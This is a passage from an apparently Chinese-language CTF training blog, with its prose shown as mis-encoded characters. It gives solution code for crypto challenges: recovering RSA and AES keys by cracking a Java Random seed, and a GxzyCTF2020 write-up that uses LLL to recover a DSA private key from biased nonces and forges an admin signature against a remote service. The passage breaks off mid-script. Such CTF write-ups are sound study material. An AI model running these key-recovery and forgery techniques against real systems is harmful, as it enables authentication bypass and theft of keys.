class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CMA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CMA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> PRNG_seed = <span class="number">0L</span>;</span><br><span class="line">        SeedAttack localSeedAttack = <span class="keyword">new</span> SeedAttack();</span><br><span class="line">        <span class="keyword">long</span> d1 = -<span class="number">1029728314L</span>;</span><br><span class="line">        <span class="keyword">long</span> d2 = <span class="number">1487023297L</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PRNG_seed = localSeedAttack.crack_seed(d1, d2);</span><br><span class="line"><span class="comment">//            System.out.println(PRNG_seed);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.random.setSeed(PRNG_seed ^ <span class="number">0x5DEECE66DL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// discard trash which generate old.txt</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discardTrash</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">19</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="keyword">this</span>.random.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">genRSA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        BigInteger e = BigInteger.valueOf(<span class="number">17L</span>);</span><br><span class="line">        ArrayList&lt;ArrayList&gt; RSA_params = <span class="keyword">new</span> ArrayList&lt;ArrayList&gt;(<span class="number">24</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">            ArrayList curRSAparams = <span class="keyword">new</span> ArrayList(<span class="number">2</span>);</span><br><span class="line">            BigInteger p = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random);</span><br><span class="line">            BigInteger q = BigInteger.probablePrime(<span class="number">512</span>, <span class="keyword">this</span>.random);</span><br><span class="line">            curRSAparams.add(p);</span><br><span class="line">            curRSAparams.add(q);</span><br><span class="line">            RSA_params.add(curRSAparams);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"prikey"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line">                ArrayList curRSAparams = RSA_params.get(i);</span><br><span class="line">                String p = curRSAparams.get(<span class="number">0</span>).toString();</span><br><span class="line">                String q = curRSAparams.get(<span class="number">1</span>).toString();</span><br><span class="line">                localPrintWriter.println(<span class="string">"("</span> + p + <span class="string">", "</span> + q + <span class="string">")"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"[+] RSA's priKey found"</span>);</span><br><span class="line">            localPrintWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException error) &#123;</span><br><span class="line">            error.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byte2hex</span><span class="params">(<span class="keyword">byte</span>[] paramArrayOfByte)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        StringBuffer localStringBuffer = <span class="keyword">new</span> StringBuffer(paramArrayOfByte.length * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; paramArrayOfByte.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((paramArrayOfByte[i] &amp; <span class="number">0xFF</span>) &lt; <span class="number">16</span>) localStringBuffer.append(<span class="string">"0"</span>);</span><br><span class="line">            localStringBuffer.append(Long.toString(paramArrayOfByte[i] &amp; <span class="number">0xFF</span>, <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> localStringBuffer.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">genKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PrintWriter localPrintWriter = <span class="keyword">new</span> PrintWriter(<span class="string">"AESkey"</span>, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] key = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">                <span class="keyword">this</span>.random.nextBytes(key);</span><br><span class="line">                localPrintWriter.println(byte2hex(key));</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"[+] AES's key found"</span>);</span><br><span class="line">            localPrintWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        CMA exp = <span class="keyword">new</span> CMA();</span><br><span class="line">        exp.discardTrash();</span><br><span class="line">        exp.genRSA();</span><br><span class="line">        exp.genKey();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">()</span>:</span></span><br><span class="line">    pqs = []</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'prikey'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fRSA:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fRSA:</span><br><span class="line">            pq = re.findall(<span class="string">r"\((.*), (.*)\)"</span>, line)[<span class="number">0</span>]</span><br><span class="line">            pqs.append((int(pq[<span class="number">0</span>]), int(pq[<span class="number">1</span>])))</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'AESkey'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fAES:</span><br><span class="line">        key = [unhexlify(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> fAES]</span><br><span class="line">        key = [key[:<span class="number">24</span>], key[<span class="number">24</span>:<span class="number">48</span>], key[<span class="number">48</span>:]]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'new.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fCIPHER:</span><br><span class="line">        cipher = [unhexlify(line.strip()) <span class="keyword">for</span> line <span class="keyword">in</span> fCIPHER]</span><br><span class="line">    <span class="keyword">return</span> pqs, key, cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec1</span><span class="params">(p, q, c, key1, key2)</span>:</span></span><br><span class="line">    aes2 = AES.new(key2, AES.MODE_CBC, iv=<span class="string">b"\x00"</span>*<span class="number">16</span>)</span><br><span class="line">    c = aes2.decrypt(c)</span><br><span class="line">    aes1 = AES.new(key1, AES.MODE_CBC, iv=<span class="string">b"\x00"</span>*<span class="number">16</span>)</span><br><span class="line">    c = bytes_to_long(aes1.decrypt(c))</span><br><span class="line">    e = <span class="number">17</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    m = pow(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(x)</span>:</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bin(x)[<span class="number">2</span>:]:</span><br><span class="line">        a = a &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (int(i)):</span><br><span class="line">            a = a ^ x</span><br><span class="line">        <span class="keyword">if</span> a &gt;&gt; <span class="number">256</span>:</span><br><span class="line">            a = a ^ <span class="number">0x10000000000000000000000000000000000000000000000000000000000000223</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        m = mul(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b"flag"</span> <span class="keyword">in</span> long_to_bytes(m):</span><br><span class="line">            print(long_to_bytes(m))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pqs, key, cipher = getData()</span><br><span class="line">    m = dec1(pqs[<span class="number">0</span>][<span class="number">0</span>], pqs[<span class="number">0</span>][<span class="number">1</span>], cipher[<span class="number">0</span>], key[<span class="number">1</span>][<span class="number">0</span>], key[<span class="number">2</span>][<span class="number">0</span>])</span><br><span class="line">    dec2(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'flag&#123;86824087489918371343860652&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="GxzyCTF2020-HNP"><a href="#GxzyCTF2020-HNP" class="headerlink" title="[GxzyCTF2020 - HNP]"></a>[GxzyCTF2020 - HNP]</h3><h4 id="é¢˜ç›®è€ƒç‚¹-1"><a href="#é¢˜ç›®è€ƒç‚¹-1" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>Hidden Number Problem</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶-1"><a href="#é¢˜ç›®æ–‡ä»¶-1" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="HNP.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>$q\rightarrow 128bits,\quad p\rightarrow 1024bits,\quad q\mid (p-1)$</p><p>$g=2^{\frac{p-1}{q}}mod\ p,\quad x\rightarrow priKey,\quad y=g^{x}mod\ p\rightarrow pubKey$</p><p><strong>ç­¾å: </strong>$r=(g^{k}mod\ p)mod\ q,\quad s=k^{-1}(H(m)+xr)mod\ q$</p><p>å˜å½¢å¯å¾—ï¼š$s^{-1}(H(m)+xr)\equiv k(mod\ q)$</p><p>å‡è®¾kå­˜åœ¨ä¸Šç•ŒKï¼Œåˆ™æœ‰$|s^{-1}H(m)+(s^{-1}r)x|&lt;K(mod\ q)$</p><p>ä»¤$A=s^{-1}H(m),\quad B=s^{-1}r$ï¼Œå¯å»ºç«‹å¦‚ä¸‹æ ¼åŸºï¼š</p><script type="math/tex; mode=display">\left[\begin{matrix}q & ... & ... & 0 & 0 & 0\\0 & q & ... & 0 & 0 & 0\\... & ... & ... & ... & ... & ...\\0 & 0 & ... & q & 0 & 0\\B_{1} & B_{2} & ... & B_{n} & a & 0\\A_{1} & A_{2} & ... & A_{n} & 0 & b\end{matrix}\right]</script><p>ä¸‹å¯¹å‚æ•°$a,b$å–å€¼è¿›è¡Œä¼°è®¡$(K=2^{121},n=35)$ï¼š</p><p>éœ€ä»¤$[k_{1},k_{2},â€¦,k_{n},ax,b]$ä¸ºSVPç›®æ ‡å‘é‡</p><p>$2^{\frac{n+1}{4}}(q^{n}ab)^{\frac{1}{n+2}}&gt;\sqrt{nK^{2}+(ax)^{2}+b^{2}}$</p><p>$2^{18}2^{128\cdot \frac{70}{37}}(ab)^{\frac{2}{37}}&gt;35\cdot 2^{242}+2^{256}a^{2}+b^{2}$</p><p>æ”¾ç¼©ä¸º$2^{260}(ab)^{\frac{2}{37}}&gt;2^{251}+2^{256}a^{2}+b^{2}$</p><p>æ˜¾ç„¶åœ¨$ab=1$æ—¶ï¼Œä»¤$a=\frac{1}{2^{64}},b=2^{64}$ï¼Œå³æ˜æ˜¾æ»¡è¶³ä¸Šè¿°ä¸ç­‰å¼ï¼ˆ$2^{128}a=b$ï¼‰</p><p>æœ¬åœ°ä½œæµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># genKey for DSA</span></span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t = getRandomNBitInteger(<span class="number">1024</span> - <span class="number">128</span> - <span class="number">1</span>)</span><br><span class="line">    p = (t * <span class="number">2</span>*q + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">e = (p - <span class="number">1</span>) // q</span><br><span class="line">g = pow(<span class="number">2</span>, e, p)</span><br><span class="line">x = getRandomRange(<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">y = int(pow(g, x, p))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(Hm)</span>:</span></span><br><span class="line">    k = getRandomRange(<span class="number">1</span>, <span class="number">2</span>**<span class="number">121</span>)</span><br><span class="line">    r = int(pow(g, k, p)) % q</span><br><span class="line">    s = (inverse(k, q) * (Hm + x * r)) % q</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_x</span><span class="params">()</span>:</span></span><br><span class="line">    M_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">        M_list.append([q * int(i == j) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">37</span>)])</span><br><span class="line">    Hm = int.from_bytes(sha256(<span class="string">b"0xDktb"</span>).digest(), <span class="string">'big'</span>)</span><br><span class="line">    As = []</span><br><span class="line">    Bs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">        r, s = sign(Hm)</span><br><span class="line">        A = (inverse(s, q) * Hm) % q</span><br><span class="line">        B = (inverse(s, q) * r) % q</span><br><span class="line">        As.append(A)</span><br><span class="line">        Bs.append(B)</span><br><span class="line">    Bs = Bs + [<span class="number">1</span>/(<span class="number">2</span>**<span class="number">64</span>), <span class="number">0</span>]</span><br><span class="line">    As = As + [<span class="number">0</span>, <span class="number">2</span>**<span class="number">64</span>]</span><br><span class="line">    M_list.append(Bs)</span><br><span class="line">    M_list.append(As)</span><br><span class="line">    M = Matrix(QQ, M_list)</span><br><span class="line">    ML = M.LLL()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> ML:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">-1</span>] == (<span class="number">2</span>**<span class="number">64</span>):</span><br><span class="line">            prikey = (line[<span class="number">-2</span>] * (<span class="number">2</span>**<span class="number">64</span>)) % q</span><br><span class="line">            print(<span class="string">"[+] SVP's solution found! prikey = &#123;&#125;"</span>.format(prikey))</span><br><span class="line">            <span class="keyword">return</span> prikey</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> x != crack_x():</span><br><span class="line">        print(<span class="string">"Failed"</span>)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/08/12/CTF-Training-Record-2/Snipaste_2020-08-18_17-07-26.png" alt></p><p>åœ¨$K=2^{121},n=35$æ—¶ï¼Œæµ‹è¯•æˆåŠŸç‡å¯è§†ä½œ100%ï¼Œä½†ä»¤$K=2^{122}$æ—¶ï¼Œè™½ç„¶ç•Œä»æ»¡è¶³ï¼Œä½†æ˜¯æˆåŠŸç‡æœ‰äº¿ç‚¹ç‚¹ä½ï¼ˆè¿·æƒ‘è¡Œä¸º</p><p>å› æ­¤è¿œç¨‹è·å–$k_bits&lt;122$çš„35ç»„ç­¾åæ•°æ®ï¼Œå³å¯ç ´è§£ç§é’¥xï¼Œæœ¬åœ°ç”Ÿæˆadminçš„ç­¾åï¼Œå®ç°è¶Šæƒ</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="comment"># io = remote(argv[1], argv[2])</span></span><br><span class="line">io = remote(<span class="string">"47.115.135.229"</span>, <span class="string">"10000"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = unhexlify(re.findall(<span class="string">r"XXX \+ ([^\)]+)"</span>, msg)[<span class="number">0</span>]).decode(<span class="string">"latin-1"</span>)</span><br><span class="line">    cipher = re.findall(<span class="string">r"== ([^\n]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode(<span class="string">"latin-1"</span>)).hexdigest() ==</span><br><span class="line">                        cipher, bytes(range(<span class="number">256</span>)).decode(<span class="string">"latin-1"</span>), length=<span class="number">3</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me XXX in hex: "</span>, hexlify(proof.encode(<span class="string">"latin-1"</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dsa_params</span><span class="params">()</span>:</span></span><br><span class="line">    params = io.recvuntil(<span class="string">"exit\n"</span>).strip().decode()</span><br><span class="line">    p = int(re.findall(<span class="string">r"p = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    q = int(re.findall(<span class="string">r"q = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    g = int(re.findall(<span class="string">r"g = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    y = int(re.findall(<span class="string">r"y = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">"p"</span>:p, <span class="string">"q"</span>:q, <span class="string">"g"</span>:g, <span class="string">"y"</span>:y&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"$ "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Please input your username: "</span>, m)</span><br><span class="line">    io.recvuntil(<span class="string">"k.bit_length() == "</span>)</span><br><span class="line">    kbits = int(io.recvline().strip().decode())</span><br><span class="line">    io.recvuntil(<span class="string">"Here is your signature in hex: "</span>)</span><br><span class="line">    sig = io.recvline().strip().decode(<span class="string">"latin-1"</span>)</span><br><span class="line">    r = int(sig[<span class="number">2</span>*len(m):<span class="number">2</span>*(len(m)+<span class="number">20</span>)], <span class="number">16</span>)</span><br><span class="line">    s = int(sig[<span class="number">2</span>*(len(m)+<span class="number">20</span>):], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> r, s, kbits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_as_admin</span><span class="params">(pubkey, prikey)</span>:</span></span><br><span class="line">    g, p, q, x = pubkey[<span class="string">'g'</span>], pubkey[<span class="string">'p'</span>], pubkey[<span class="string">'q'</span>], prikey</span><br><span class="line">    k = <span class="number">114514</span></span><br><span class="line">    Hm = int.from_bytes(sha256(<span class="string">b"admin"</span>).digest(), <span class="string">'big'</span>)</span><br><span class="line">    r = int(pow(g, k, p)) % q</span><br><span class="line">    s = (inverse(k, q) * (Hm + x*r)) % q</span><br><span class="line">    payload = hexlify(<span class="string">b"admin"</span> + long_to_bytes(r).rjust(<span class="number">20</span>, <span class="string">b"\x00"</span>) + long_to_bytes(s).rjust(<span class="number">20</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">"$ "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Please send me your signature: "</span>, payload)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_x</span><span class="params">(pubkey)</span>:</span></span><br><span class="line">    q, g = pubkey[<span class="string">'q'</span>], pubkey[<span class="string">'g'</span>]</span><br><span class="line">    M_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">        M_list.append([q * int(i == j) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">37</span>)])</span><br><span class="line">    m = <span class="string">b"0xDktb"</span></span><br><span class="line">    Hm = int.from_bytes(sha256(m).digest(), <span class="string">'big'</span>)</span><br><span class="line">    As = []</span><br><span class="line">    Bs = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">35</span>:</span><br><span class="line">    